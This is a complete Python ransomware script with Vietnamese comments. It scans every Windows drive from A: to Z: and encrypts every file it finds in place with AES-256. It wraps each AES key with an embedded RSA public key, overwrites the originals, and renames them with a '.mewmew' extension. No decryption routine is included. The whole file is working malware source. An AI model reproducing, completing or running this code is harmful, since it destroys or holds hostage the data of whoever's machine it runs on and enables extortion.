import base64
import os
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as symmetric_padding
from cryptography.hazmat.primitives.asymmetric import rsa

# Tải khóa công khai từ base64 (sử dụng base64 trực tiếp trong code)
public_key_base64 = """LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFxbjZJUTBQeW5wd3UxTUFtaGRITwpSWHFkQnZGVHQ1dks3STFzL3JLRC95RVN3YXRNajJoMEJ0eWNIWkdESWI2bmpabGY4b1dnbzRlNHhvWmdkRGxtCjY2TVdTZVV2L1pGMm1wU0FjVEpDRTh2bHdJMTFNdTRPRFFSZUVVckpNYVRGb1g5ZmRhbFEzdDVVUFppUmRXbysKQjR2alR3dWdBT2V1WnZKSkJzc25MRE96NkhQZ0hBOUJSR1YzaHRJYkNJVkttQlVDS3J0bXNkVFArUXphWlhtVwo4ZmQ0dVlmQkxuRkdncGNmdk1pWHVqK2RYSW05TXlMQVZvWGZNeHdLWmNRci96NzhuYXQ4S2Z3R204bHdQaGpWCmVZUmFEZmN4Y2hUdC9pcFFkVDhEbjN1TE53aXVpNENEZEQ3dWZGMExoZ0swalhPMHdDYU9jZktxSXBjb1pjeVMKM3dJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg=="""  # Thay thế bằng khóa công khai dưới dạng base64

# Tải khóa công khai từ base64
def load_public_key():
    public_key_bytes = base64.b64decode(public_key_base64)
    public_key = serialization.load_pem_public_key(public_key_bytes, backend=default_backend())
    return public_key

# Mã hóa file
def encrypt_file(file_path, public_key):
    try:
        # Đọc dữ liệu từ file cần mã hóa
        with open(file_path, "rb") as f:
            file_data = f.read()

        # Tạo khóa AES ngẫu nhiên
        aes_key = os.urandom(32)  # AES 256-bit key
        iv = os.urandom(16)  # IV cho CBC mode

        # Mã hóa dữ liệu bằng AES
        cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()

        # Padding dữ liệu để đảm bảo đúng độ dài cho AES
        padder = symmetric_padding.PKCS7(128).padder()
        padded_data = padder.update(file_data) + padder.finalize()
        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

        # Mã hóa khóa AES bằng khóa công khai RSA
        encrypted_aes_key = public_key.encrypt(
            aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

        # Ghi dữ liệu đã mã hóa vào file (bao gồm khóa AES đã mã hóa, IV và dữ liệu mã hóa)
        with open(file_path, "wb") as f:
            f.write(encrypted_aes_key)  # Ghi khóa AES đã mã hóa
            f.write(iv)  # Ghi IV
            f.write(encrypted_data)  # Ghi dữ liệu đã mã hóa
        

        # Đổi đuôi file thành .mewmew
        new_file_path = file_path + ".mewmew"
        os.rename(file_path, new_file_path)
        
        
    except PermissionError as e:
        print(f"Không thể truy cập file '{file_path}': {e}")
    except Exception as e:
        print(f"Lỗi khi mã hóa file '{file_path}': {e}")

# Quét và mã hóa các file trong một thư mục
def encrypt_directory(directory_path, public_key):
    for root, dirs, files in os.walk(directory_path):
        for file in files:
            file_path = os.path.join(root, file)
            
            encrypt_file(file_path, public_key)

# Quét tất cả các ổ đĩa trên hệ thống Windows
def get_all_drives():
    drives = []
    for drive_letter in range(65, 91):  # Kiểm tra các ổ từ A: đến Z:
        drive = chr(drive_letter) + ":\\"
        if os.path.exists(drive):  # Kiểm tra xem ổ đĩa có tồn tại không
            drives.append(drive)
    return drives

# Chạy chương trình mã hóa
if __name__ == "__main__":
    public_key = load_public_key()  # Tải khóa công khai
    drives = get_all_drives()  # Lấy tất cả các ổ đĩa
    for drive in drives:
        
        encrypt_directory(drive, public_key)  # Mã hóa toàn bộ thư mục trong ổ đĩa
